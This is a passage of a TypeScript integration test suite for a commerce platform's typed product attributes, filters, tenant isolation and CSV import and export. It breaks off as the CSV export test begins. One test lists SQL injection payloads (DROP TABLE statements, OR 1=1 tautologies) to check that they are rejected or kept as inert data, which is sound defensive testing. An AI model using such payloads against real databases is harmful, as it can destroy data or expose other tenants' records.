/**
 * `commerce` typed catalog attributes + CSV import/export (Issue #291) — real
 * PostgreSQL, real RLS, real migrations, via the shared harness. Same "call the
 * application layer directly under `withTenantOrThrow`" style as
 * `commerce-catalog.integration.test.ts`: RLS, composite FKs, typed columns and
 * query shape are database properties.
 *
 * Covers: definition CRUD + immutability, typed value storage and locale-
 * independent numerics, applicability, public/admin visibility, every filter
 * operator, SQL-injection payloads in keys/values/operators (the schema must
 * survive and no row may leak), free-text search across searchable attributes,
 * RLS + composite-FK tenant isolation, CSV export escaping, import dry-run/apply
 * parity, all-or-nothing, idempotent re-apply, and a large (row-ceiling) import.
 */
import {
  afterAll,
  beforeAll,
  beforeEach,
  describe,
  expect,
  test
} from "bun:test";

import { withTenantOrThrow } from "../../src/lib/database/tenant-context";
import {
  AttributeAppliesToInUseError,
  AttributeOptionInUseError,
  createAttributeDefinition,
  deleteAttributeDefinition,
  DuplicateAttributeKeyError,
  listAttributeDefinitions,
  updateAttributeDefinition
} from "../../src/modules/commerce/application/attribute-definition-directory";
import {
  buildAttributeFilterFragment,
  resolveAttributeFilterRequest
} from "../../src/modules/commerce/application/attribute-filter-sql";
import {
  attachPublicAttributes,
  AttributeTargetNotFoundError,
  loadAttributeSets,
  setAttributesForTarget
} from "../../src/modules/commerce/application/attribute-value-directory";
import {
  applyCatalogImport,
  dryRunCatalogImport
} from "../../src/modules/commerce/application/catalog-import";
import { exportCatalogCsv } from "../../src/modules/commerce/application/catalog-export";
import {
  createProduct,
  deleteProduct,
  listProducts
} from "../../src/modules/commerce/application/product-directory";
import { createProductVariant } from "../../src/modules/commerce/application/product-variant-directory";
import type { AttributeDefinitionInput } from "../../src/modules/commerce/domain/attribute-definition";
import { MAX_CATALOG_IMPORT_ROWS } from "../../src/modules/commerce/domain/catalog-import";
import type { CreateProductInput } from "../../src/modules/commerce/domain/product-validation";
import {
  getAdminSql,
  getRuntimeSql,
  getWorkerRoleSql,
  integrationEnabled,
  resetDatabase,
  setupIntegrationDatabase,
  teardownIntegrationDatabase,
  workerRoleActivated
} from "./harness";

const suite = integrationEnabled ? describe : describe.skip;

const TENANT_A = "11111111-1111-1111-1111-111111111111";
const TENANT_B = "22222222-2222-2222-2222-222222222222";
const ACTOR = "33333333-3333-3333-3333-333333333333";

function inTenant<T>(
  tenantId: string,
  fn: (tx: Bun.SQL) => Promise<T>
): Promise<T> {
  return withTenantOrThrow(getRuntimeSql(), tenantId, fn);
}

async function seedTenant(id: string, code: string): Promise<void> {
  const admin = getAdminSql();
  await admin`
    INSERT INTO awcms_tenants
      (id, tenant_code, tenant_name, legal_name, status, default_locale, default_theme)
    VALUES (${id}, ${code}, ${code + " Name"}, ${code + " Legal"}, 'active', 'en', 'light')
    ON CONFLICT (id) DO NOTHING
  `;
}

const BASE_PRODUCT: CreateProductInput = {
  categoryId: null,
  type: "physical",
  sku: "SKU-BASE",
  name: "Base Product",
  slug: "base-product",
  description: null,
  digitalNote: null,
  price: "45000.00",
  discountPercent: 0,
  stock: 10,
  label: null,
  labelColor: null,
  priceLevel2: null,
  priceLevel3: null,
  priceLevel4: null,
  costPrice: null,
  minPurchase: 1,
  weightGrams: 0,
  manualRating: null,
  manualSoldCount: 0,
  withInsurance: false,
  insuranceRequired: false,
  insuranceFee: null,
  promoBannerShow: false,
  promoBannerTitle: null,
  promoBannerSubtitle: null,
  promoBannerBadge: null,
  promoBannerIcon: null,
  promoBannerColor: null,
  sizeChartType: "none",
  sizeChartMediaId: null,
  sizeChartDetails: null,
  serviceForm: null,
  subscriptionPeriod: null,
  downloadLink: null,
  allowDp: false,
  allowFreeShipping: true,
  variantAttributes: null,
  isFeatured: false,
  isRecommended: false
};

function definitionInput(
  overrides: Partial<AttributeDefinitionInput> & { key: string }
): AttributeDefinitionInput {
  return {
    label: overrides.key,
    labels: {},
    valueType: "text",
    constraints: {},
    appliesTo: "product",
    isSearchable: false,
    isFilterable: false,
    visibleAdmin: true,
    visiblePublic: false,
    sortOrder: 0,
    ...overrides
  };
}

async function makeProduct(
  tenantId: string,
  overrides: Partial<CreateProductInput>
): Promise<{ id: string; sku: string }> {
  return inTenant(tenantId, (tx) =>
    createProduct(tx, tenantId, ACTOR, { ...BASE_PRODUCT, ...overrides })
  );
}

async function makeDefinition(
  tenantId: string,
  overrides: Partial<AttributeDefinitionInput> & { key: string }
) {
  return inTenant(tenantId, (tx) =>
    createAttributeDefinition(tx, tenantId, ACTOR, definitionInput(overrides))
  );
}

async function setAttributes(
  tenantId: string,
  productId: string,
  attributes: Record<string, unknown>,
  variantId?: string
) {
  return inTenant(tenantId, (tx) =>
    setAttributesForTarget(
      tx,
      tenantId,
      ACTOR,
      { productId, variantId },
      attributes
    )
  );
}

async function filterSkus(
  tenantId: string,
  params: string[],
  audience: "admin" | "public" = "admin",
  q?: string
): Promise<string[]> {
  // A rejection is RETURNED out of the transaction and thrown afterwards: an
  // exception escaping `withTenantOrThrow` counts against the database circuit
  // breaker, and an expected 400 is not a database failure.
  const outcome = await inTenant(tenantId, async (tx) => {
    const resolved = await resolveAttributeFilterRequest(
      tx,
      tenantId,
      params,
      audience
    );
    if (!resolved.valid) return { rejected: resolved.message } as const;
    const page = await listProducts(tx, tenantId, null, {
      attributeFilters: resolved.filters,
      attributeAudience: audience,
      q,
      sort: "name"
    });
    return { skus: page.items.map((item) => item.sku).sort() } as const;
  });
  if ("rejected" in outcome)
    throw new Error(`filter rejected: ${outcome.rejected}`);
  return outcome.skus;
}

async function valueCount(tenantId: string): Promise<number> {
  const rows = (await getAdminSql()`
    SELECT count(*)::int AS n FROM awcms_commerce_product_attribute_values
    WHERE tenant_id = ${tenantId} AND deleted_at IS NULL
  `) as { n: number }[];
  return Number(rows[0]!.n);
}

async function productCount(tenantId: string): Promise<number> {
  const rows = (await getAdminSql()`
    SELECT count(*)::int AS n FROM awcms_commerce_products WHERE tenant_id = ${tenantId}
  `) as { n: number }[];
  return Number(rows[0]!.n);
}

suite("commerce typed attributes + catalog import/export (Issue #291)", () => {
  beforeAll(async () => {
    await setupIntegrationDatabase();
  }, 120000);

  afterAll(async () => {
    await teardownIntegrationDatabase();
  }, 60000);

  beforeEach(async () => {
    await resetDatabase();
    await seedTenant(TENANT_A, "tenant-a");
    await seedTenant(TENANT_B, "tenant-b");
  }, 30000);

  describe("definitions", () => {
    test("create/list/update/delete; the key is unique among live definitions and freed by delete", async () => {
      const color = await makeDefinition(TENANT_A, {
        key: "color",
        valueType: "enum",
        constraints: {
          options: [
            { value: "red", label: "Red" },
            { value: "blue", label: "Blue" }
          ]
        }
      });

      await expect(
        makeDefinition(TENANT_A, { key: "color" })
      ).rejects.toBeInstanceOf(DuplicateAttributeKeyError);
      // The same key in another tenant is a different attribute.
      await makeDefinition(TENANT_B, { key: "color" });

      const updated = await inTenant(TENANT_A, (tx) =>
        updateAttributeDefinition(tx, TENANT_A, ACTOR, color.id, {
          label: "Colour",
          labels: { id: "Warna" },
          isFilterable: true
        })
      );
      expect(updated?.label).toBe("Colour");
      expect(updated?.labels).toEqual({ id: "Warna" });
      expect(updated?.isFilterable).toBe(true);

      expect(
        await inTenant(TENANT_A, (tx) =>
          deleteAttributeDefinition(tx, TENANT_A, ACTOR, color.id)
        )
      ).toBe(true);
      expect(
        await inTenant(TENANT_A, (tx) => listAttributeDefinitions(tx, TENANT_A))
      ).toEqual([]);
      // The key is free again.
      await makeDefinition(TENANT_A, { key: "color" });
    });

    test("an enum option a stored value uses cannot be removed; appliesTo cannot strand values", async () => {
      const size = await makeDefinition(TENANT_A, {
        key: "size",
        valueType: "enum",
        appliesTo: "both",
        constraints: {
          options: [
            { value: "s", label: "S" },
            { value: "m", label: "M" }
          ]
        }
      });
      const product = await makeProduct(TENANT_A, {});
      const variant = await inTenant(TENANT_A, (tx) =>
        createProductVariant(tx, TENANT_A, ACTOR, product.id, {
          name: "Size",
          value: "S",
          colorHex: null,
          imageMediaObjectId: null,
          sku: null,
          price: null,
          priceLevel2: null,
          priceLevel3: null,
          priceLevel4: null,
          stock: 0,
          weightGrams: 0,
          sortOrder: 0
        } as never)
      );
      expect(
        (await setAttributes(TENANT_A, product.id, { size: "s" })).ok
      ).toBe(true);
      expect(
        (
          await setAttributes(
            TENANT_A,
            product.id,
            { size: "m" },
            (variant as { id: string }).id
          )
        ).ok
      ).toBe(true);

      await expect(
        inTenant(TENANT_A, (tx) =>
          updateAttributeDefinition(tx, TENANT_A, ACTOR, size.id, {
            constraints: { options: [{ value: "m", label: "M" }] }
          })
        )
      ).rejects.toBeInstanceOf(AttributeOptionInUseError);

      await expect(
        inTenant(TENANT_A, (tx) =>
          updateAttributeDefinition(tx, TENANT_A, ACTOR, size.id, {
            appliesTo: "product"
          })
        )
      ).rejects.toBeInstanceOf(AttributeAppliesToInUseError);
    });
  });

  describe("typed values", () => {
    test("every type stores in its own column; decimals are locale-independent and canonical", async () => {
      await makeDefinition(TENANT_A, { key: "material", valueType: "text" });
      await makeDefinition(TENANT_A, { key: "pieces", valueType: "integer" });
      await makeDefinition(TENANT_A, {
        key: "weight",
        valueType: "decimal",
        constraints: { scale: 3 }
      });
      await makeDefinition(TENANT_A, { key: "organic", valueType: "boolean" });
      await makeDefinition(TENANT_A, { key: "best_before", valueType: "date" });
      const product = await makeProduct(TENANT_A, {});

      const result = await setAttributes(TENANT_A, product.id, {
        material: "  Cotton ",
        pieces: 12,
        weight: "1.250",
        organic: true,
        best_before: "2027-02-28"
      });
      expect(result).toEqual({
        ok: true,
        changedKeys: expect.arrayContaining([
          "material",
          "pieces",
          "weight",
          "organic",
          "best_before"
        ])
      });

      const rows = (await getAdminSql()`
        SELECT d.key, v.value_text, v.value_scaled::text AS value_scaled,
               v.value_boolean, v.value_date::text AS value_date, v.value_search
        FROM awcms_commerce_product_attribute_values v
        JOIN awcms_commerce_attribute_definitions d ON d.id = v.definition_id
        WHERE v.product_id = ${product.id}
      `) as Record<string, unknown>[];
      const byKey = Object.fromEntries(
        rows.map((row) => [row.key as string, row])
      );
      expect(byKey.material).toMatchObject({
        value_text: "Cotton",
        value_search: "cotton"
      });
      expect(byKey.pieces).toMatchObject({ value_scaled: "12000000" });
      expect(byKey.weight).toMatchObject({ value_scaled: "1250000" });
      expect(byKey.organic).toMatchObject({ value_boolean: true });
      expect(byKey.best_before).toMatchObject({ value_date: "2027-02-28" });

      const admin = await inTenant(TENANT_A, (tx) =>
        loadAttributeSets(tx, TENANT_A, [product.id], "admin")
      );
      const wire = Object.fromEntries(
        admin.get(product.id)!.product.map((entry) => [entry.key, entry.value])
      );
      // integer -> number, decimal -> canonical string, boolean -> boolean.
      expect(wire).toEqual({
        material: "Cotton",
        pieces: 12,
        weight: "1.25",
        organic: true,
        best_before: "2027-02-28"
      });
    });

    test("an invalid entry rejects the whole request and writes nothing; clearing and re-saving are exact", async () => {
      await makeDefinition(TENANT_A, { key: "weight", valueType: "decimal" });
      await makeDefinition(TENANT_A, { key: "material" });
      const product = await makeProduct(TENANT_A, {});

      const bad = await setAttributes(TENANT_A, product.id, {
        material: "ok",
        weight: "1,5"
      });
      expect(bad.ok).toBe(false);
      expect(await valueCount(TENANT_A)).toBe(0);

      const unknown = await setAttributes(TENANT_A, product.id, { nope: "x" });
      expect(unknown.ok).toBe(false);

      expect(
        (
          await setAttributes(TENANT_A, product.id, {
            material: "a",
            weight: "2"
          })
        ).ok
      ).toBe(true);
      const again = await setAttributes(TENANT_A, product.id, {
        material: "a",
        weight: "2.0"
      });
      expect(again).toEqual({ ok: true, changedKeys: [] });
      const cleared = await setAttributes(TENANT_A, product.id, {
        material: null
      });
      expect(cleared).toEqual({ ok: true, changedKeys: ["material"] });
      expect(await valueCount(TENANT_A)).toBe(1);
    });

    test("clearing is a soft delete: hidden everywhere, re-setting inserts a live row, and the purge role can age the cleared row out", async () => {
      await makeDefinition(TENANT_A, { key: "material", isFilterable: true });
      const product = await makeProduct(TENANT_A, {});
      await setAttributes(TENANT_A, product.id, { material: "cotton" });
      expect(await filterSkus(TENANT_A, ["material:eq:cotton"])).toEqual([
        "SKU-BASE"
      ]);

      await setAttributes(TENANT_A, product.id, { material: null });
      // Hidden from every read path and from filters...
      expect(await valueCount(TENANT_A)).toBe(0);
      expect(await filterSkus(TENANT_A, ["material:eq:cotton"])).toEqual([]);
      const sets = await inTenant(TENANT_A, (tx) =>
        loadAttributeSets(tx, TENANT_A, [product.id], "admin")
      );
      expect(sets.get(product.id)!.product).toEqual([]);
      // ...but the row still exists, stamped, until the lifecycle purge ages it out.
      const admin = getAdminSql();
      const kept = (await admin`
        SELECT count(*)::int AS n FROM awcms_commerce_product_attribute_values
        WHERE product_id = ${product.id} AND deleted_at IS NOT NULL
      `) as { n: number }[];
      expect(Number(kept[0]!.n)).toBe(1);

      // Setting it again inserts a fresh LIVE row beside the cleared one.
      await setAttributes(TENANT_A, product.id, { material: "linen" });
      expect(await valueCount(TENANT_A)).toBe(1);
      expect(await filterSkus(TENANT_A, ["material:eq:linen"])).toEqual([
        "SKU-BASE"
      ]);

      if (workerRoleActivated) {
        // The purge engine's own statement shape, as awcms_worker under RLS:
        // it reaches only the cleared row older than the window, never the
        // live one.
        await admin`
          UPDATE awcms_commerce_product_attribute_values
          SET deleted_at = now() - interval '400 days'
          WHERE product_id = ${product.id} AND deleted_at IS NOT NULL
        `;
        const worker = getWorkerRoleSql();
        const purged = await worker.begin(async (tx) => {
          await tx.unsafe(`SET LOCAL app.current_tenant_id = '${TENANT_A}'`);
          return (await tx`
            DELETE FROM awcms_commerce_product_attribute_values
            WHERE tenant_id = ${TENANT_A}
              AND deleted_at < now() - interval '365 days'
            RETURNING id
          `) as { id: string }[];
        });
        expect(purged).toHaveLength(1);
        expect(await valueCount(TENANT_A)).toBe(1);
      }
    });

    test("applicability: product-only definitions reject variants and the variant must belong to the product", async () => {
      await makeDefinition(TENANT_A, { key: "material" });
      await makeDefinition(TENANT_A, { key: "finish", appliesTo: "variant" });
      const first = await makeProduct(TENANT_A, { sku: "P1", slug: "p1" });
      const second = await makeProduct(TENANT_A, { sku: "P2", slug: "p2" });
      const variant = (await inTenant(TENANT_A, (tx) =>
        createProductVariant(tx, TENANT_A, ACTOR, first.id, {
          name: "Size",
          value: "L",
          colorHex: null,
          imageMediaObjectId: null,
          sku: null,
          price: null,
          priceLevel2: null,
          priceLevel3: null,
          priceLevel4: null,
          stock: 0,
          weightGrams: 0,
          sortOrder: 0
        } as never)
      )) as { id: string };

      expect(
        (await setAttributes(TENANT_A, first.id, { finish: "matte" })).ok
      ).toBe(false);
      expect(
        (await setAttributes(TENANT_A, first.id, { material: "x" }, variant.id))
          .ok
      ).toBe(false);
      expect(
        (
          await setAttributes(
            TENANT_A,
            first.id,
            { finish: "matte" },
            variant.id
          )
        ).ok
      ).toBe(true);
      await expect(
        setAttributes(TENANT_A, second.id, { finish: "matte" }, variant.id)
      ).rejects.toBeInstanceOf(AttributeTargetNotFoundError);
    });
  });

  describe("filters, search and visibility", () => {
    async function seedCatalog() {
      await makeDefinition(TENANT_A, {
        key: "color",
        valueType: "enum",
        isFilterable: true,
        isSearchable: true,
        visiblePublic: true,
        constraints: {
          options: [
            { value: "red", label: "Red" },
            { value: "blue", label: "Blue" }
          ]
        }
      });
      await makeDefinition(TENANT_A, {
        key: "weight",
        valueType: "decimal",
        isFilterable: true,
        visiblePublic: true
      });
      await makeDefinition(TENANT_A, {
        key: "released",
        valueType: "date",
        isFilterable: true,
        visiblePublic: true
      });
      await makeDefinition(TENANT_A, {
        key: "organic",
        valueType: "boolean",
        isFilterable: true,
        visiblePublic: true
      });
      await makeDefinition(TENANT_A, {
        key: "brand",
        isFilterable: true,
        isSearchable: true,
        visiblePublic: true
      });
      await makeDefinition(TENANT_A, {
        key: "supplier_grade",
        isFilterable: true,
        isSearchable: true,
        visiblePublic: false
      });
      await makeDefinition(TENANT_A, { key: "internal_note" });

      const a = await makeProduct(TENANT_A, {
        sku: "A",
        slug: "a",
        name: "Alpha"
      });
      const b = await makeProduct(TENANT_A, {
        sku: "B",
        slug: "b",
        name: "Beta"
      });
      const c = await makeProduct(TENANT_A, {
        sku: "C",
        slug: "c",
        name: "Gamma"
      });
      await setAttributes(TENANT_A, a.id, {
        color: "red",
        weight: "1.5",
        released: "2026-01-10",
        organic: true,
        brand: "Kopi Borneo",
        supplier_grade: "A+",
        internal_note: "secret"
      });
      await setAttributes(TENANT_A, b.id, {
        color: "blue",
        weight: "10",
        released: "2026-06-01",
        organic: false,
        brand: "Teh Kalimantan"
      });
      await setAttributes(TENANT_A, c.id, {
        weight: "2.25",
        brand: "Kopi Jawa"
      });
      return { a, b, c };
    }

    test("each operator selects exactly the matching products", async () => {
      await seedCatalog();
      expect(await filterSkus(TENANT_A, ["color:eq:red"])).toEqual(["A"]);
      expect(await filterSkus(TENANT_A, ["color:in:red,blue"])).toEqual([
        "A",
        "B"
      ]);
      expect(await filterSkus(TENANT_A, ["weight:gte:2"])).toEqual(["B", "C"]);
      expect(await filterSkus(TENANT_A, ["weight:lte:2"])).toEqual(["A"]);
      // Exact numeric comparison, not lexical: 10 > 2.25 > 1.5.
      expect(
        await filterSkus(TENANT_A, ["weight:gte:1.5", "weight:lte:2.25"])
      ).toEqual(["A", "C"]);
      expect(await filterSkus(TENANT_A, ["released:gte:2026-03-01"])).toEqual([
        "B"
      ]);
      expect(await filterSkus(TENANT_A, ["released:eq:2026-01-10"])).toEqual([
        "A"
      ]);
      expect(await filterSkus(TENANT_A, ["organic:eq:true"])).toEqual(["A"]);
      expect(await filterSkus(TENANT_A, ["organic:eq:false"])).toEqual(["B"]);
      expect(await filterSkus(TENANT_A, ["brand:eq:kopi borneo"])).toEqual([
        "A"
      ]);
      expect(await filterSkus(TENANT_A, ["brand:contains:kopi"])).toEqual([
        "A",
        "C"
      ]);
      expect(
        await filterSkus(TENANT_A, ["color:eq:red", "weight:gte:1"])
      ).toEqual(["A"]);
      expect(
        await filterSkus(TENANT_A, ["color:eq:red", "weight:gte:5"])
      ).toEqual([]);
    });

    test("free-text q still matches name/sku and now also searchable attributes, by audience", async () => {
      await seedCatalog();
      expect(await filterSkus(TENANT_A, [], "admin", "alpha")).toEqual(["A"]);
      expect(await filterSkus(TENANT_A, [], "admin", "kalimantan")).toEqual([
        "B"
      ]);
      expect(await filterSkus(TENANT_A, [], "admin", "borneo")).toEqual(["A"]);
      // A searchable attribute that is NOT public never matches a public search.
      expect(await filterSkus(TENANT_A, [], "admin", "a+")).toEqual(["A"]);
      expect(await filterSkus(TENANT_A, [], "public", "a+")).toEqual([]);
      // LIKE wildcards in the term are literal.
      expect(await filterSkus(TENANT_A, [], "admin", "%")).toEqual([]);
    });

    test("public audience: only filterable+public keys filter, only visible_public values are returned", async () => {
      const { a } = await seedCatalog();

      await expect(
        filterSkus(TENANT_A, ["supplier_grade:eq:a+"], "public")
      ).rejects.toThrow(/not available for filtering/);
      await expect(
        filterSkus(TENANT_A, ["internal_note:eq:secret"], "public")
      ).rejects.toThrow(/not available for filtering/);
      await expect(
        filterSkus(TENANT_A, ["nope:eq:x"], "public")
      ).rejects.toThrow(/not available for filtering/);
      expect(
        await filterSkus(TENANT_A, ["supplier_grade:eq:a+"], "admin")
      ).toEqual(["A"]);

      const publicItems = await inTenant(TENANT_A, (tx) =>
        attachPublicAttributes(tx, TENANT_A, [{ id: a.id }])
      );
      const keys = publicItems[0]!.attributes.map((entry) => entry.key).sort();
      expect(keys).toEqual(["brand", "color", "organic", "released", "weight"]);
      expect(keys).not.toContain("supplier_grade");
      expect(keys).not.toContain("internal_note");
      const color = publicItems[0]!.attributes.find(
        (entry) => entry.key === "color"
      );
      expect(color).toMatchObject({
        value: "red",
        valueLabel: "Red",
        valueType: "enum"
      });

      const admin = await inTenant(TENANT_A, (tx) =>
        loadAttributeSets(tx, TENANT_A, [a.id], "admin")
      );
      expect(admin.get(a.id)!.product.map((entry) => entry.key)).toContain(
        "internal_note"
      );
    });

    test("a variant-level value makes its PRODUCT match the filter", async () => {
      await makeDefinition(TENANT_A, {
        key: "finish",
        appliesTo: "variant",
        isFilterable: true,
        visiblePublic: true
      });
      const product = await makeProduct(TENANT_A, { sku: "V1", slug: "v1" });
      await makeProduct(TENANT_A, { sku: "V2", slug: "v2" });
      const variant = (await inTenant(TENANT_A, (tx) =>
        createProductVariant(tx, TENANT_A, ACTOR, product.id, {
          name: "Size",
          value: "L",
          colorHex: null,
          imageMediaObjectId: null,
          sku: null,
          price: null,
          priceLevel2: null,
          priceLevel3: null,
          priceLevel4: null,
          stock: 0,
          weightGrams: 0,
          sortOrder: 0
        } as never)
      )) as { id: string };
      await setAttributes(
        TENANT_A,
        product.id,
        { finish: "matte" },
        variant.id
      );

      expect(await filterSkus(TENANT_A, ["finish:eq:matte"])).toEqual(["V1"]);
      const publicItems = await inTenant(TENANT_A, async (tx) =>
        attachPublicAttributes(tx, TENANT_A, [
          { id: product.id, variants: [{ id: variant.id }] }
        ])
      );
      const variants = publicItems[0]!.variants as unknown as {
        attributes: { key: string }[];
      }[];
      expect(variants[0]!.attributes.map((entry) => entry.key)).toEqual([
        "finish"
      ]);
    });

    test("injection payloads in keys, operators and values never alter the query or the schema", async () => {
      await seedCatalog();
      const before = await productCount(TENANT_A);

      const rejected = [
        `color";DROP TABLE awcms_commerce_products;--:eq:red`,
        `color:eq;DROP TABLE awcms_commerce_products:red`,
        `color) OR 1=1 --:eq:red`,
        `weight:gte:1; DROP TABLE awcms_commerce_products`,
        `weight:gte:1 OR 1=1`,
        `released:eq:2026-01-10' OR '1'='1`,
        `color:eq:red' OR '1'='1`,
        `organic:eq:true OR 1=1`,
        `color:in:red,blue) OR (1=1`
      ];
      for (const payload of rejected) {
        await expect(filterSkus(TENANT_A, [payload])).rejects.toThrow();
      }

      // Free-text values are accepted ONLY as inert bound strings and match nothing.
      for (const payload of [
        "' OR '1'='1",
        "x'); DROP TABLE awcms_commerce_products; --",
        '" OR ""="',
        "\\' OR 1=1 --"
      ]) {
        expect(await filterSkus(TENANT_A, [`brand:eq:${payload}`])).toEqual([]);
        expect(
          await filterSkus(TENANT_A, [`brand:contains:${payload}`])
        ).toEqual([]);
        expect(await filterSkus(TENANT_A, [], "admin", payload)).toEqual([]);
      }
      // ...and payload-shaped VALUES stored through the API are inert data too.
      const product = await makeProduct(TENANT_A, { sku: "INJ", slug: "inj" });
      expect(
        (
          await setAttributes(TENANT_A, product.id, {
            brand: "'); DROP TABLE x; --"
          })
        ).ok
      ).toBe(true);
      expect(await filterSkus(TENANT_A, ["brand:contains:drop table"])).toEqual(
        ["INJ"]
      );

      expect(await productCount(TENANT_A)).toBe(before + 1);
    });
  });

  describe("query plans (index choice is measured, not assumed)", () => {
    // 20,000 products with one decimal, one date and one text attribute each,
    // ANALYZEd, then EXPLAINed AS the `awcms_app` role under the real RLS
    // policy — the role/RLS combination changes which plans are legal (only
    // leakproof operators may be index conditions; `numeric`'s are not, which is
    // why numbers are a scaled bigint). Asserts the SELECTIVE filters use the
    // purpose-built indexes of sql/963 and that no value query ever seq-scans the
    // values table. Timings are recorded in the ADR, never asserted here.
    test("selective decimal/date/text filters use the sql/963 indexes under RLS", async () => {
      const admin = getAdminSql();
      await makeDefinition(TENANT_A, {
        key: "weight",
        valueType: "decimal",
        isFilterable: true
      });
      await makeDefinition(TENANT_A, {
        key: "released",
        valueType: "date",
        isFilterable: true
      });
      await makeDefinition(TENANT_A, { key: "brand", isFilterable: true });
      await admin.unsafe(`
        INSERT INTO awcms_commerce_products
          (tenant_id, type, sku, name, slug, price, stock, status, min_purchase, weight_grams)
        SELECT '${TENANT_A}', 'physical', 'PLAN-' || g, 'Plan ' || g, 'plan-' || g,
               1000, 1, 'active', 1, 0
        FROM generate_series(1, 20000) g;
        INSERT INTO awcms_commerce_product_attribute_values
          (tenant_id, definition_id, product_id, value_scaled)
        SELECT p.tenant_id, d.id, p.id, ((abs(hashtext(p.sku)) % 10000) * 10000)::bigint
        FROM awcms_commerce_products p
        JOIN awcms_commerce_attribute_definitions d ON d.tenant_id = p.tenant_id AND d.key = 'weight';
        INSERT INTO awcms_commerce_product_attribute_values
          (tenant_id, definition_id, product_id, value_date)
        SELECT p.tenant_id, d.id, p.id, DATE '2024-01-01' + (abs(hashtext(p.sku || 'd')) % 1095)
        FROM awcms_commerce_products p
        JOIN awcms_commerce_attribute_definitions d ON d.tenant_id = p.tenant_id AND d.key = 'released';
        INSERT INTO awcms_commerce_product_attribute_values
          (tenant_id, definition_id, product_id, value_text, value_search)
        SELECT p.tenant_id, d.id, p.id,
               'Brand ' || (abs(hashtext(p.sku || 't')) % 400),
               'brand ' || (abs(hashtext(p.sku || 't')) % 400)
        FROM awcms_commerce_products p
        JOIN awcms_commerce_attribute_definitions d ON d.tenant_id = p.tenant_id AND d.key = 'brand';
        ANALYZE awcms_commerce_products;
        ANALYZE awcms_commerce_attribute_definitions;
        ANALYZE awcms_commerce_product_attribute_values;
      `);

      const plan = (params: string[]) =>
        inTenant(TENANT_A, async (tx) => {
          const resolved = await resolveAttributeFilterRequest(
            tx,
            TENANT_A,
            params,
            "admin"
          );
          if (!resolved.valid) return `rejected: ${resolved.message}`;
          const fragment = buildAttributeFilterFragment(
            tx,
            TENANT_A,
            resolved.filters
          );
          const rows = (await tx`
            EXPLAIN (FORMAT JSON)
            SELECT id FROM awcms_commerce_products AS p
            WHERE tenant_id = ${TENANT_A} AND deleted_at IS NULL
            ${fragment}
            ORDER BY created_at DESC, id DESC LIMIT 100
          `) as { "QUERY PLAN": unknown }[];
          return JSON.stringify(rows[0]!["QUERY PLAN"]);
        });

      const decimal = await plan(["weight:gte:99.5"]);
      expect(decimal).toContain(
        "awcms_commerce_product_attribute_values_scaled_idx"
      );

      const date = await plan(["released:eq:2025-05-05"]);
      expect(date).toContain(
        "awcms_commerce_product_attribute_values_date_idx"
      );

      const text = await plan(["brand:eq:brand 77"]);
      expect(text).toContain(
        "awcms_commerce_product_attribute_values_search_idx"
      );

      for (const explained of [decimal, date, text]) {
        expect(explained).not.toContain(
          '"Node Type":"Seq Scan","Parallel Aware":false,"Async Capable":false,"Relation Name":"awcms_commerce_product_attribute_values"'
        );
      }
    }, 120000);
  });

  describe("tenant isolation", () => {
    test("RLS: tenant B sees none of tenant A's definitions or values; filters never cross tenants", async () => {
      await makeDefinition(TENANT_A, { key: "color", isFilterable: true });
      const product = await makeProduct(TENANT_A, { sku: "A1", slug: "a1" });
      await setAttributes(TENANT_A, product.id, { color: "red" });

      expect(
        await inTenant(TENANT_B, (tx) => listAttributeDefinitions(tx, TENANT_B))
      ).toEqual([]);
      const leak = (await inTenant(
        TENANT_B,
        (tx) =>
          tx`SELECT count(*)::int AS n FROM awcms_commerce_product_attribute_values`
      )) as { n: number }[];
      expect(Number(leak[0]!.n)).toBe(0);

      await makeDefinition(TENANT_B, { key: "color", isFilterable: true });
      const other = await makeProduct(TENANT_B, { sku: "B1", slug: "b1" });
      await setAttributes(TENANT_B, other.id, { color: "red" });
      expect(await filterSkus(TENANT_A, ["color:eq:red"])).toEqual(["A1"]);
      expect(await filterSkus(TENANT_B, ["color:eq:red"])).toEqual(["B1"]);

      // Tenant A cannot write onto tenant B's product.
      await expect(
        setAttributes(TENANT_A, other.id, { color: "x" })
      ).rejects.toBeInstanceOf(AttributeTargetNotFoundError);
    });

    test("composite FKs reject a cross-tenant reference even from a connection that bypasses RLS", async () => {
      const definition = await makeDefinition(TENANT_A, { key: "color" });
      const productB = await makeProduct(TENANT_B, { sku: "B1", slug: "b1" });
      const admin = getAdminSql();

      // A Bun.SQL query is a lazy thenable; run it inside a real async
      // function so `rejects` observes a genuine Promise.
      const attempt = async (
        tenantId: string,
        definitionId: string,
        productId: string,
        twoColumns = false
      ): Promise<void> => {
        if (twoColumns) {
          await admin`
            INSERT INTO awcms_commerce_product_attribute_values
              (tenant_id, definition_id, product_id, value_text, value_scaled)
            VALUES (${tenantId}, ${definitionId}, ${productId}, 'x', 1)
          `;
          return;
        }
        await admin`
          INSERT INTO awcms_commerce_product_attribute_values
            (tenant_id, definition_id, product_id, value_text, value_search)
          VALUES (${tenantId}, ${definitionId}, ${productId}, 'red', 'red')
        `;
      };

      // Tenant B's row naming tenant A's definition.
      await expect(
        attempt(TENANT_B, definition.id, productB.id)
      ).rejects.toThrow();
      // Tenant A's row naming tenant B's product.
      await expect(
        attempt(TENANT_A, definition.id, productB.id)
      ).rejects.toThrow();
      // Two typed columns at once.
      const productA = await makeProduct(TENANT_A, { sku: "A1", slug: "a1" });
      await expect(
        attempt(TENANT_A, definition.id, productA.id, true)
      ).rejects.toThrow();
      // The well-formed row is accepted, so the rejections above were the constraints.
      await attempt(TENANT_A, definition.id, productA.id);
    });

    test("purging a product cascades its values away", async () => {
      await makeDefinition(TENANT_A, { key: "color" });
      const product = await makeProduct(TENANT_A, {});
      await setAttributes(TENANT_A, product.id, { color: "red" });
      await inTenant(TENANT_A, (tx) =>
        deleteProduct(tx, TENANT_A, ACTOR, product.id)
      );
      expect(await valueCount(TENANT_A)).toBe(1); // soft delete keeps values
      await getAdminSql()`DELETE FROM awcms_commerce_products WHERE id = ${product.id}`;
      expect(await valueCount(TENANT_A)).toBe(0);
    });
  });

  describe("CSV export and import", () => {
    async function seedExportable() {
      await makeDefinition(TENANT_A, {
        key: "weight",
        valueType: "decimal",
        visiblePublic: true
      });
      await makeDefinition(TENANT_A, {
        key: "color",
        valueType: "enum",
        constraints: {
          options: [
            { value: "red", label: "Red" },
            { value: "blue", label: "Blue" }
          ]
        }
      });
      await makeDefinition(TENANT_A, { key: "note" });
    }

    test("export neutralises formulas, quotes per RFC 4180, and re-imports as all-unchanged", async () => {
      await seedExportable();
      const evil = await makeProduct(TENANT_A, {
